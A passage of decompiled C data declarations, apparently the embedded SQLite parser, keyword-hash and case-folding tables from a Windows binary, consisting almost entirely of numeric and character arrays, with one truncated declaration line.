}; // weak
__int16 word_100FD820[420] =
{
  993,
  1114,
  1343,
  1114,
  1213,
  1213,
  90,
  90,
  0,
  -19,
  1213,
  1213,
  1213,
  1213,
  1213,
  352,
  517,
  721,
  1091,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1236,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  1213,
  -49,
  199,
  517,
  517,
  913,
  913,
  382,
  1177,
  55,
  647,
  573,
  499,
  425,
  351,
  277,
  203,
  129,
  795,
  795,
  795,
  795,
  795,
  795,
  795,
  795,
  795,
  795,
  795,
  795,
  795,
  795,
  795,
  795,
  795,
  795,
  869,
  795,
  943,
  1017,
  1017,
  -69,
  -69,
  -69,
  -69,
  -1,
  -1,
  58,
  138,
  -44,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  202,
  579,
  517,
  517,
  517,
  517,
  517,
  382,
  885,
  1450,
  -90,
  -90,
  -90,
  1293,
  73,
  272,
  272,
  309,
  311,
  297,
  282,
  216,
  602,
  538,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  517,
  505,
  231,
  231,
  231,
  706,
  64,
  1177,
  1177,
  1177,
  -90,
  -90,
  -90,
  136,
  168,
  168,
  12,
  496,
  496,
  496,
  506,
  423,
  512,
  370,
  349,
  335,
  149,
  149,
  149,
  149,
  604,
  516,
  149,
  149,
  508,
  3,
  299,
  677,
  871,
  613,
  613,
  879,
  871,
  879,
  144,
  382,
  226,
  382,
  226,
  564,
  226,
  613,
  226,
  226,
  404,
  625,
  625,
  382,
  426,
  -89,
  801,
  1464,
  1244,
  1244,
  1457,
  1457,
  1244,
  1462,
  1412,
  1188,
  1470,
  1470,
  1470,
  1470,
  1244,
  1188,
  1462,
  1412,
  1412,
  1244,
  1443,
  1338,
  1423,
  1244,
  1244,
  1443,
  1244,
  1443,
  1244,
  1443,
  1414,
  1306,
  1306,
  1306,
  1365,
  1348,
  1348,
  1414,
  1306,
  1317,
  1306,
  1365,
  1306,
  1306,
  1267,
  1268,
  1267,
  1268,
  1267,
  1268,
  1244,
  1244,
  1216,
  1214,
  1215,
  1192,
  1173,
  1188,
  1177,
  1260,
  1253,
  1253,
  1248,
  1248,
  1248,
  1248,
  -90,
  -90,
  -90,
  -90,
  -90,
  -90,
  939,
  102,
  614,
  84,
  133,
  14,
  837,
  396,
  829,
  825,
  796,
  757,
  751,
  650,
  357,
  244,
  107,
  54,
  305,
  278,
  1207,
  1203,
  1183,
  1063,
  1179,
  1137,
  1166,
  1172,
  1170,
  1064,
  1152,
  1046,
  1057,
  1034,
  1126,
  1041,
  1129,
  1142,
  1031,
  1120,
  1012,
  1056,
  1048,
  1018,
  1098,
  1086,
  1001,
  1097,
  1076,
  1058,
  971,
  936,
  1026,
  1052,
  1025,
  1013,
  1027,
  967,
  1044,
  1032,
  1050,
  945,
  949,
  1028,
  995,
  1024,
  1021,
  963,
  981,
  928,
  953,
  951,
  870,
  876,
  897,
  838,
  720,
  828,
  794,
  820,
  498,
  642,
  783,
  657,
  729,
  642,
  557,
  507,
  509,
  497,
  470,
  478,
  449,
  294,
  228,
  443,
  23,
  152,
  123,
  68,
  -20,
  -42,
  57,
  39,
  -3,
  5,
  0
}; // weak
__int16 word_100FDB68[316] =
{
  310,
  994,
  1134,
  221,
  169,
  157,
  89,
  18,
  83,
  301,
  377,
  316,
  312,
  16,
  295,
  238,
  249,
  391,
  1301,
  1295,
  1282,
  1269,
  1263,
  1256,
  1251,
  1240,
  1234,
  1228,
  1221,
  1208,
  1109,
  1103,
  1077,
  1054,
  1022,
  1016,
  911,
  908,
  890,
  888,
  874,
  816,
  800,
  760,
  742,
  739,
  726,
  684,
  672,
  665,
  652,
  612,
  610,
  594,
  591,
  578,
  530,
  528,
  526,
  524,
  -72,
  -221,
  399,
  469,
  445,
  438,
  143,
  222,
  359,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  523,
  307,
  523,
  523,
  1110,
  678,
  1033,
  965,
  962,
  891,
  814,
  813,
  744,
  771,
  691,
  607,
  522,
  743,
  686,
  740,
  328,
  418,
  670,
  666,
  596,
  527,
  529,
  583,
  523,
  523,
  523,
  523,
  523,
  593,
  823,
  738,
  712,
  892,
  1199,
  1185,
  1176,
  1171,
  673,
  673,
  1168,
  1167,
  1162,
  1159,
  1148,
  1145,
  1139,
  1117,
  1111,
  1107,
  1084,
  1066,
  1049,
  1011,
  1010,
  1006,
  1002,
  999,
  998,
  973,
  972,
  970,
  966,
  964,
  895,
  894,
  892,
  833,
  822,
  762,
  761,
  229,
  811,
  804,
  803,
  389,
  688,
  808,
  807,
  737,
  460,
  464,
  572,
  584,
  1355,
  1366,
  1365,
  1352,
  1354,
  1353,
  1352,
  1326,
  1335,
  1342,
  1335,
  1335,
  1335,
  1335,
  1335,
  1335,
  1335,
  1295,
  1295,
  1335,
  1335,
  1321,
  1362,
  1331,
  1378,
  1326,
  1315,
  1314,
  1280,
  1322,
  1278,
  1341,
  1352,
  1340,
  1350,
  1338,
  1332,
  1336,
  1303,
  1334,
  1333,
  1281,
  1275,
  1274,
  1340,
  1307,
  1308,
  1350,
  1255,
  1343,
  1342,
  1255,
  1253,
  1338,
  1275,
  1304,
  1293,
  1299,
  1298,
  1297,
  1295,
  1329,
  1286,
  1264,
  1292,
  1289,
  1322,
  1321,
  1235,
  1226,
  1315,
  1314,
  1311,
  1308,
  1307,
  1305,
  1299,
  1279,
  1277,
  1276,
  1270,
  1258,
  1211,
  1209,
  1250,
  1259,
  1255,
  1242,
  1243,
  1241,
  1201,
  1200,
  1184,
  1186,
  1182,
  1178,
  1165,
  1206,
  1204,
  1113,
  1135,
  1095,
  1124,
  1105,
  1102,
  1096,
  1112,
  1140,
  1136,
  1121,
  1116,
  1115,
  1089,
  985,
  961,
  987,
  1061,
  1038,
  1053,
  0,
  0,
  0
}; // weak
__int16 word_100FDDE0[632] =
{
  636,
  872,
  961,
  961,
  961,
  872,
  901,
  901,
  961,
  760,
  961,
  961,
  961,
  961,
  870,
  961,
  961,
  935,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  844,
  961,
  961,
  961,
  901,
  901,
  675,
  764,
  795,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  934,
  936,
  810,
  809,
  803,
  802,
  914,
  775,
  800,
  793,
  786,
  797,
  873,
  866,
  867,
  865,
  869,
  874,
  961,
  796,
  832,
  850,
  831,
  849,
  856,
  848,
  834,
  843,
  833,
  667,
  835,
  836,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  662,
  729,
  961,
  961,
  961,
  961,
  961,
  961,
  837,
  838,
  853,
  852,
  851,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  941,
  939,
  961,
  885,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  642,
  961,
  760,
  760,
  760,
  636,
  961,
  961,
  961,
  961,
  953,
  764,
  754,
  720,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  805,
  743,
  924,
  926,
  961,
  907,
  741,
  664,
  762,
  677,
  752,
  644,
  799,
  777,
  777,
  919,
  799,
  919,
  701,
  961,
  789,
  961,
  789,
  698,
  789,
  777,
  789,
  789,
  868,
  961,
  961,
  961,
  761,
  752,
  961,
  946,
  768,
  768,
  938,
  938,
  768,
  811,
  733,
  799,
  740,
  740,
  740,
  740,
  768,
  799,
  811,
  733,
  733,
  768,
  659,
  913,
  911,
  768,
  768,
  659,
  768,
  659,
  768,
  659,
  878,
  731,
  731,
  731,
  716,
  882,
  882,
  878,
  731,
  701,
  731,
  716,
  731,
  731,
  781,
  776,
  781,
  776,
  781,
  776,
  768,
  768,
  961,
  794,
  782,
  792,
  790,
  799,
  961,
  719,
  652,
  652,
  641,
  641,
  641,
  641,
  958,
  958,
  953,
  703,
  703,
  685,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  887,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  637,
  948,
  961,
  961,
  945,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  917,
  961,
  961,
  961,
  961,
  961,
  961,
  910,
  909,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  791,
  961,
  783,
  961,
  871,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  961,
  746,
  820,
  961,
  819,
  823,
  818,
  669,
  961,
  650,
  961,
  633,
  638,
  957,
  960,
  959,
  956,
  955,
  954,
  949,
  947,
  944,
  943,
  942,
  940,
  937,
  933,
  891,
  889,
  896,
  895,
  894,
  893,
  892,
  890,
  888,
  886,
  806,
  804,
  801,
  798,
  932,
  884,
  742,
  739,
  738,
  658,
  950,
  916,
  925,
  923,
  812,
  922,
  921,
  920,
  918,
  915,
  902,
  808,
  807,
  734,
  876,
  875,
  661,
  906,
  905,
  904,
  908,
  912,
  903,
  770,
  660,
  657,
  666,
  723,
  722,
  730,
  728,
  727,
  726,
  725,
  724,
  721,
  668,
  676,
  687,
  715,
  700,
  699,
  881,
  883,
  880,
  879,
  708,
  707,
  713,
  712,
  711,
  710,
  709,
  706,
  705,
  704,
  697,
  696,
  702,
  695,
  718,
  717,
  714,
  694,
  737,
  736,
  735,
  732,
  693,
  692,
  691,
  823,
  690,
  689,
  829,
  828,
  816,
  860,
  757,
  756,
  755,
  767,
  766,
  779,
  778,
  814,
  813,
  780,
  765,
  759,
  758,
  774,
  773,
  772,
  771,
  763,
  753,
  785,
  788,
  787,
  784,
  845,
  862,
  769,
  859,
  931,
  930,
  929,
  928,
  927,
  864,
  863,
  830,
  827,
  680,
  681,
  900,
  898,
  899,
  897,
  683,
  682,
  679,
  678,
  861,
  748,
  747,
  857,
  854,
  846,
  841,
  858,
  855,
  847,
  842,
  840,
  839,
  825,
  824,
  822,
  821,
  817,
  826,
  671,
  749,
  745,
  744,
  815,
  751,
  750,
  688,
  686,
  684,
  665,
  663,
  656,
  654,
  653,
  655,
  651,
  649,
  648,
  647,
  646,
  645,
  674,
  673,
  672,
  670,
  669,
  643,
  640,
  639,
  635,
  634,
  632,
  0
}; // weak
char byte_100FE2D0[] = { '\0' }; // weak
char byte_100FE318[] = { '\x8E' }; // weak
char byte_100FE319[659] =
{
  '\x01',
  '\x8F',
  '\x02',
  '\x8F',
  '\x01',
  '\x90',
  '\x01',
  '\x90',
  '\x03',
  '\x91',
  '\0',
  '\x91',
  '\x01',
  '\x91',
  '\x03',
  '\x92',
  '\x01',
  '\x93',
  '\x03',
  '\x95',
  '\0',
  '\x95',
  '\x01',
  '\x95',
  '\x02',
  '\x94',
  '\0',
  '\x94',
  '\x01',
  '\x94',
  '\x01',
  '\x94',
  '\x01',
  '\x93',
  '\x02',
  '\x93',
  '\x02',
  '\x93',
  '\x02',
  '\x97',
  '\x01',
  '\x97',
  '\0',
  '\x93',
  '\x02',
  '\x93',
  '\x03',
  '\x93',
  '\x05',
  '\x93',
  '\x02',
  '\x98',
  '\x06',
  '\x9A',
  '\x01',
  '\x9C',
  '\0',
  '\x9C',
  '\x03',
  '\x9B',
  '\x01',
  '\x9B',
  '\0',
  '\x99',
  '\x04',
  '\x99',
  '\x02',
  '\x9E',
  '\x03',
  '\x9E',
  '\x01',
  '\xA1',
  '\x03',
  '\xA2',
  '\x01',
  '\xA5',
  '\x01',
  '\xA5',
  '\x01',
  '\xA6',
  '\x01',
  '\x96',
  '\x01',
  '\x96',
  '\x01',
  '\x96',
  '\x01',
  '\xA3',
  '\0',
  '\xA3',
  '\x01',
  '\xA7',
  '\x01',
  '\xA7',
  '\x04',
  '\xA7',
  '\x06',
  '\xA8',
  '\x01',
  '\xA8',
  '\x02',
  '\xA9',
  '\x01',
  '\xA9',
  '\x01',
  '\xA4',
  '\x02',
  '\xA4',
  '\0',
  '\xAC',
  '\x03',
  '\xAC',
  '\x01',
  '\xAD',
  '\x02',
  '\xAD',
  '\x04',
  '\xAD',
  '\x03',
  '\xAD',
  '\x03',
  '\xAD',
  '\x02',
  '\xAD',
  '\x02',
  '\xAD',
  '\x03',
  '\xAD',
  '\x05',
  '\xAD',
  '\x02',
  '\xAD',
  '\x04',
  '\xAD',
  '\x04',
  '\xAD',
  '\x01',
  '\xAD',
  '\x02',
  '\xB2',
  '\0',
  '\xB2',
  '\x01',
  '\xB4',
  '\0',
  '\xB4',
  '\x02',
  '\xB6',
  '\x02',
  '\xB6',
  '\x03',
  '\xB6',
  '\x03',
  '\xB6',
  '\x03',
  '\xB7',
  '\x02',
  '\xB7',
  '\x02',
  '\xB7',
  '\x01',
  '\xB7',
  '\x01',
  '\xB7',
  '\x02',
  '\xB5',
  '\x03',
  '\xB5',
  '\x02',
  '\xB8',
  '\0',
  '\xB8',
  '\x02',
  '\xB8',
  '\x02',
  '\x9F',
  '\0',
  '\x9F',
  '\x02',
  '\xB9',
  '\x03',
  '\xB9',
  '\x02',
  '\xB9',
  '\x01',
  '\xBA',
  '\x02',
  '\xBA',
  '\a',
  '\xBA',
  '\x05',
  '\xBA',
  '\x05',
  '\xBA',
  '\n',
  '\xBC',
  '\0',
  '\xBC',
  '\x01',
  '\xB0',
  '\0',
  '\xB0',
  '\x03',
  '\xBD',
  '\0',
  '\xBD',
  '\x02',
  '\xBE',
  '\x01',
  '\xBE',
  '\x01',
  '\xBE',
  '\x01',
  '\x93',
  '\x04',
  '\xC0',
  '\x02',
  '\xC0',
  '\0',
  '\x93',
  '\b',
  '\x93',
  '\x04',
  '\x93',
  '\x01',
  '\xA0',
  '\x01',
  '\xA0',
  '\x03',
  '\xC3',
  '\x01',
  '\xC3',
  '\x02',
  '\xC3',
  '\x01',
  '\xC2',
  '\t',
  '\xC4',
  '\x01',
  '\xC4',
  '\x01',
  '\xC4',
  '\0',
  '\xCC',
  '\x02',
  '\xCC',
  '\0',
  '\xC5',
  '\x03',
  '\xC5',
  '\x02',
  '\xC5',
  '\x04',
  '\xCD',
  '\x02',
  '\xCD',
  '\x01',
  '\xCD',
  '\0',
  '\xC6',
  '\0',
  '\xC6',
  '\x02',
  '\xCF',
  '\x02',
  '\xCF',
  '\0',
  '\xCE',
  '\a',
  '\xCE',
  '\a',
  '\xCE',
  '\a',
  '\x9D',
  '\0',
  '\x9D',
  '\x02',
  '\xC1',
  '\x02',
  '\xD0',
  '\x01',
  '\xD0',
  '\x02',
  '\xD0',
  '\x03',
  '\xD0',
  '\x04',
  '\xD2',
  '\x02',
  '\xD2',
  '\0',
  '\xD1',
  '\0',
  '\xD1',
  '\x03',
  '\xD1',
  '\x02',
  '\xD3',
  '\x04',
  '\xD3',
  '\0',
  '\xCA',
  '\0',
  '\xCA',
  '\x03',
  '\xD6',
  '\x04',
  '\xD6',
  '\x02',
  '\xD7',
  '\x01',
  '\xB1',
  '\x01',
  '\xB1',
  '\x01',
  '\xB1',
  '\0',
  '\xC8',
  '\0',
  '\xC8',
  '\x03',
  '\xC9',
  '\0',
  '\xC9',
  '\x02',
  '\xCB',
  '\0',
  '\xCB',
  '\x02',
  '\xCB',
  '\x04',
  '\xCB',
  '\x04',
  '\x93',
  '\x05',
  '\xC7',
  '\0',
  '\xC7',
  '\x02',
  '\x93',
  '\a',
  '\xD9',
  '\x05',
  '\xD9',
  '\x03',
  '\x93',
  '\b',
  '\x93',
  '\x05',
  '\x93',
  '\x06',
  '\xDA',
  '\x02',
  '\xDA',
  '\x01',
  '\xDC',
  '\x03',
  '\xDC',
  '\x01',
  '\xDB',
  '\0',
  '\xDB',
  '\x03',
  '\xD5',
  '\x03',
  '\xD5',
  '\x01',
  '\xAF',
  '\x01',
  '\xAF',
  '\x03',
  '\xAE',
  '\x01',
  '\xAF',
  '\x01',
  '\xAF',
  '\x01',
  '\xAF',
  '\x03',
  '\xAF',
  '\x05',
  '\xAE',
  '\x01',
  '\xAE',
  '\x01',
  '\xAF',
  '\x01',
  '\xAF',
  '\x01',
  '\xAF',
  '\x03',
  '\xAF',
  '\x06',
  '\xAF',
  '\x05',
  '\xAF',
  '\x04',
  '\xAE',
  '\x01',
  '\xAF',
  '\x03',
  '\xAF',
  '\x03',
  '\xAF',
  '\x03',
  '\xAF',
  '\x03',
  '\xAF',
  '\x03',
  '\xAF',
  '\x03',
  '\xAF',
  '\x03',
  '\xAF',
  '\x03',
  '\xDE',
  '\x01',
  '\xDE',
  '\x02',
  '\xDE',
  '\x01',
  '\xDE',
  '\x02',
  '\xDF',
  '\x02',
  '\xDF',
  '\0',
  '\xAF',
  '\x04',
  '\xAF',
  '\x02',
  '\xAF',
  '\x03',
  '\xAF',
  '\x03',
  '\xAF',
  '\x04',
  '\xAF',
  '\x02',
  '\xAF',
  '\x02',
  '\xAF',
  '\x02',
  '\xAF',
  '\x02',
  '\xE0',
  '\x01',
  '\xE0',
  '\x02',
  '\xAF',
  '\x05',
  '\xE1',
  '\x01',
  '\xE1',
  '\x02',
  '\xAF',
  '\x05',
  '\xAF',
  '\x03',
  '\xAF',
  '\x05',
  '\xAF',
  '\x04',
  '\xAF',
  '\x04',
  '\xAF',
  '\x05',
  '\xE3',
  '\x05',
  '\xE3',
  '\x04',
  '\xE4',
  '\x02',
  '\xE4',
  '\0',
  '\xE2',
  '\x01',
  '\xE2',
  '\0',
  '\xDD',
  '\x01',
  '\xDD',
  '\0',
  '\xD8',
  '\x03',
  '\xD8',
  '\x01',
  '\x93',
  '\v',
  '\xE5',
  '\x01',
  '\xE5',
  '\0',
  '\xB3',
  '\0',
  '\xB3',
  '\x03',
  '\xBB',
  '\x05',
  '\xBB',
  '\x03',
  '\xE6',
  '\0',
  '\xE6',
  '\x02',
  '\x93',
  '\x04',
  '\x93',
  '\x01',
  '\x93',
  '\x02',
  '\x93',
  '\x03',
  '\x93',
  '\x05',
  '\x93',
  '\x06',
  '\x93',
  '\x05',
  '\x93',
  '\x06',
  '\xE7',
  '\x01',
  '\xE7',
  '\x01',
  '\xE7',
  '\x01',
  '\xE7',
  '\x01',
  '\xE7',
  '\x01',
  '\xAA',
  '\x02',
  '\xAB',
  '\x02',
  '\xE9',
  '\x01',
  '\xE8',
  '\x01',
  '\xE8',
  '\0',
  '\x93',
  '\x05',
  '\xEA',
  '\v',
  '\xEC',
  '\x01',
  '\xEC',
  '\x01',
  '\xEC',
  '\x02',
  '\xEC',
  '\0',
  '\xED',
  '\x01',
  '\xED',
  '\x01',
  '\xED',
  '\x03',
  '\xEE',
  '\0',
  '\xEE',
  '\x03',
  '\xEF',
  '\0',
  '\xEF',
  '\x02',
  '\xEB',
  '\x03',
  '\xEB',
  '\x02',
  '\xF1',
  '\x01',
  '\xF1',
  '\x03',
  '\xF2',
  '\0',
  '\xF2',
  '\x03',
  '\xF2',
  '\x02',
  '\xF0',
  '\a',
  '\xF0',
  '\b',
  '\xF0',
  '\x05',
  '\xF0',
  '\x05',
  '\xF0',
  '\x01',
  '\xAF',
  '\x04',
  '\xAF',
  '\x06',
  '\xBF',
  '\x01',
  '\xBF',
  '\x01',
  '\xBF',
  '\x01',
  '\x93',
  '\x04',
  '\x93',
  '\x06',
  '\x93',
  '\x03',
  '\xF4',
  '\0',
  '\xF4',
  '\x02',
  '\xF3',
  '\x01',
  '\xF3',
  '\0',
  '\x93',
  '\x01',
  '\x93',
  '\x03',
  '\x93',
  '\x01',
  '\x93',
  '\x03',
  '\x93',
  '\x06',
  '\x93',
  '\x06',
  '\xF5',
  '\x01',
  '\xF6',
  '\0',
  '\xF6',
  '\x01',
  '\x93',
  '\x01',
  '\x93',
  '\x04',
  '\xF7',
  '\a',
  '\xF8',
  '\x01',
  '\xF8',
  '\x03',
  '\xF9',
  '\0',
  '\xF9',
  '\x02',
  '\xFA',
  '\x01',
  '\xFA',
  '\x03',
  '\xFB',
  '\x01',
  '\xFC',
  '\0',
  '\xFC',
  '\x04',
  '\xFC',
  '\x02'
}; // weak
char aNaturaleftoute[34] = "naturaleftouterightfullinnercross"; // weak
_UNKNOWN unk_100FE5D0; // weak
char byte_100FE5D2[19] =
{
  '\x04',
  '\x06',
  '\x04',
  '(',
  '\n',
  '\x05',
  ' ',
  '\x0E',
  '\x05',
  '0',
  '\x13',
  '\x04',
  '8',
  '\x17',
  '\x05',
  '\x01',
  '\x1C',
  '\x05',
  '\x03'
}; // weak
_UNKNOWN unk_100FE5E5; // weak
char *off_100FE5E8 = "1"; // weak
char byte_100FE5F0[] = { '\x01' }; // weak
char byte_100FE5F1[7] = { '\x01', '\x03', '\0', '\x05', '\0', '\x06', '\0' }; // weak
_UNKNOWN unk_100FE5F8; // weak
_UNKNOWN unk_100FE61C; // weak
char aReindexedescapweak
char byte_100FE888[128] =
{
  'H',
  'e',
  'r',
  'F',
  '\0',
  '-',
  '\0',
  '\0',
  'N',
  '\0',
  'I',
  '\0',
  '\0',
  '*',
  '\f',
  'J',
  '\x0F',
  '\0',
  'q',
  'Q',
  '2',
  'l',
  '\0',
  '\x13',
  '\0',
  '\0',
  'v',
  '\0',
  't',
  'o',
  '\0',
  '\x16',
  'Y',
  '\0',
  '\t',
  '\0',
  '\0',
  'B',
  'C',
  '\0',
  'A',
  '\x06',
  '\0',
  '0',
  'V',
  'b',
  '\0',
  's',
  'a',
  '\0',
  '\0',
  ',',
  '\0',
  'c',
  '\x18',
  '\0',
  '\x11',
  '\0',
  'w',
  '1',
  '\x17',
  '\0',
  '\x05',
  'j',
  '\x19',
  '\\',
  '\0',
  '\0',
  'y',
  'f',
  '8',
  'x',
  '5',
  '\x1C',
  '3',
  '\0',
  'W',
  '\0',
  '`',
  '\x1A',
  '\0',
  '_',
  '\0',
  '\0',
  '\0',
  '[',
  'X',
  ']',
  'T',
  'i',
  '\x0E',
  '\'',
  'h',
  '\0',
  'M',
  '\0',
  '\x12',
  'U',
  'k',
  ' ',
  '\0',
  'u',
  'L',
  'm',
  ':',
  '.',
  'P',
  '\0',
  '\0',
  'Z',
  '(',
  '\0',
  'p',
  '\0',
  '$',
  '\0',
  '\0',
  '\x1D',
  '\0',
  'R',
  ';',
  '<',
  '\0',
  '\x14',
  '9',
  '\0',
  '4',
  '\0'
}; // weak
char byte_100FE908[] = { '\0' }; // weak
char byte_100FE988[128] =
{
  '\a',
  '\a',
  '\x05',
  '\x04',
  '\x06',
  '\x04',
  '\x05',
  '\x03',
  '\x06',
  '\a',
  '\x03',
  '\x06',
  '\x06',
  '\a',
  '\a',
  '\x03',
  '\b',
  '\x02',
  '\x06',
  '\x05',
  '\x04',
  '\x04',
  '\x03',
  '\n',
  '\x04',
  '\x06',
  '\v',
  '\x06',
  '\x02',
  '\a',
  '\x05',
  '\x05',
  '\t',
  '\x06',
  '\t',
  '\t',
  '\a',
  '\n',
  '\n',
  '\x04',
  '\x06',
  '\x02',
  '\x03',
  '\t',
  '\x04',
  '\x02',
  '\x06',
  '\x05',
  '\x06',
  '\x06',
  '\x05',
  '\x06',
  '\x05',
  '\x05',
  '\a',
  '\a',
  '\a',
  '\x03',
  '\x02',
  '\x04',
  '\x04',
  '\a',
  '\x03',
  '\x06',
  '\x04',
  '\a',
  '\x06',
  '\f',
  '\x06',
  '\t',
  '\x04',
  '\x06',
  '\x05',
  '\x04',
  '\a',
  '\x06',
  '\x05',
  '\x06',
  '\a',
  '\x05',
  '\x04',
  '\x05',
  '\x06',
  '\x05',
  '\a',
  '\x03',
  '\a',
  '\r',
  '\x02',
  '\x02',
  '\x04',
  '\x06',
  '\x06',
  '\b',
  '\x05',
  '\x11',
  '\f',
  '\a',
  '\b',
  '\b',
  '\x02',
  '\x04',
  '\x04',
  '\x04',
  '\x04',
  '\x04',
  '\x02',
  '\x02',
  '\x06',
  '\x05',
  '\b',
  '\x05',
  '\x05',
  '\b',
  '\x03',
  '\x05',
  '\x05',
  '\x06',
  '\x04',
  '\t',
  '\x03',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
__int16 word_100FEA08[8] = { 0, 2, 2, 8, 9, 14, 16, 20 }; // weak
int dword_100FEA18[54] =
{
  1638423,
  1900569,
  2359329,
  3014697,
  3473456,
  3866678,
  4259902,
  4522051,
  5308494,
  5963862,
  6291551,
  6881381,
  7667821,
  8388730,
  9306248,
  10420376,
  10616994,
  10944677,
  11206823,
  11731120,
  12386488,
  12910786,
  13500619,
  14221522,
  14614751,
  14811359,
  15270117,
  15597802,
  16253172,
  17105151,
  18284817,
  19005728,
  19726632,
  20316463,
  20971835,
  21758278,
  22348113,
  22937944,
  23658850,
  24248683,
  24510836,
  25362815,
  26149257,
  27001239,
  28049820,
  28967347,
  29491643,
  30015942,
  30540238,
  30867925,
  31392217,
  32178659,
  32768495,
  33489404
}; // weak
char byte_100FEAF0[16] =
{
  '\x04',
  '\x02',
  '\t',
  '\x02',
  '\x0F',
  '\x02',
  '\x13',
  '\x02',
  '\x18',
  '\x02',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
char byte_100FEB00[124] =
{
  '@',
  '\x1B',
  '\x8A',
  ')',
  'Q',
  '+',
  'e',
  '4',
  '\"',
  'n',
  '-',
  '.',
  '1',
  '\x02',
  '0',
  '\x8C',
  '(',
  '\x18',
  't',
  '\x10',
  '_',
  '\x88',
  '\v',
  'm',
  '\x89',
  'r',
  '\x06',
  '\x1D',
  'h',
  '_',
  '\x8B',
  '8',
  '\t',
  '\x14',
  '\r',
  's',
  '<',
  'f',
  '`',
  '\x7F',
  '6',
  '5',
  'l',
  '\x15',
  '\x15',
  'D',
  'd',
  '\x03',
  '!',
  '|',
  '{',
  'k',
  '\x05',
  '_',
  '\x0E',
  'G',
  'J',
  '\x13',
  '3',
  'b',
  '1',
  '$',
  ' ',
  'j',
  '\x86',
  '\\',
  '\x11',
  'B',
  '*',
  '\b',
  'x',
  'i',
  '2',
  '\x04',
  '\x1F',
  '7',
  '\x1C',
  '\x80',
  '?',
  '}',
  '\x87',
  '~',
  'A',
  '\x1E',
  '9',
  'E',
  'a',
  'g',
  '\x0F',
  'H',
  '%',
  '&',
  '\n',
  '\'',
  '_',
  'B',
  'B',
  'c',
  '\a',
  'u',
  'F',
  'o',
  ',',
  'w',
  '_',
  '1',
  '#',
  '\x12',
  'I',
  'z',
  ':',
  '_',
  '_',
  '\f',
  ';',
  'p',
  'y',
  '=',
  '>',
  '/',
  'q',
  '\0',
  '\0',
  '\0'
}; // weak
int (__cdecl *off_100FEB7C[2])(int) = { &sub_10070B4E, &sub_10070B7B }; // weak
_UNKNOWN unk_100FEC08; // weak
char byte_100FEC14[4] = { '\x03', '\x02', '\x01', '\0' }; // weak
_UNKNOWN unk_100FEC18; // weak
_UNKNOWN unk_100FEC1C; // weak
_UNKNOWN unk_100FEC20; // weak
char byte_100FEC24[16] =
{
  '0',
  '1',
  '2',
  '3',
  '4',
  '5',
  '6',
  '7',
  '8',
  '9',
  'A',
  'B',
  'C',
  'D',
  'E',
  'F'
}; // weak
char *off_100FEC34 = " "; // weak
_UNKNOWN unk_100FEC48; // weak
char byte_100FEEB4[] = { '\0' }; // weak
char byte_100FEEC0[256] =
{
  '\0',
  '\x01',
  '\x02',
  '\x03',
  '\x04',
  '\x05',
  '\x06',
  '\a',
  '\b',
  '\t',
  '\n',
  '\v',
  '\f',
  '\r',
  '\x0E',
  '\x0F',
  '\x10',
  '\x11',
  '\x12',
  '\x13',
  '\x14',
  '\x15',
  '\x16',
  '\x17',
  '\x18',
  '\x19',
  '\x1A',
  '\x1B',
  '\x1C',
  '\x1D',
  '\x1E',
  '\x1F',
  ' ',
  '!',
  '\"',
  '#',
  '$',
  '%',
  '&',
  '\'',
  '(',
  ')',
  '*',
  '+',
  ',',
  '-',
  '.',
  '/',
  '0',
  '1',
  '2',
  '3',
  '4',
  '5',
  '6',
  '7',
  '8',
  '9',
  ':',
  ';',
  '<',
  '=',
  '>',
  '?',
  '@',
  'a',
  'b',
  'c',
  'd',
  'e',
  'f',
  'g',
  'h',
  'i',
  'j',
  'k',
  'l',
  'm',
  'n',
  'o',
  'p',
  'q',
  'r',
  's',
  't',
  'u',
  'v',
  'w',
  'x',
  'y',
  'z',
  '[',
  '\\',
  ']',
  '^',
  '_',
  '`',
  'a',
  'b',
  'c',
  'd',
  'e',
  'f',
  'g',
  'h',
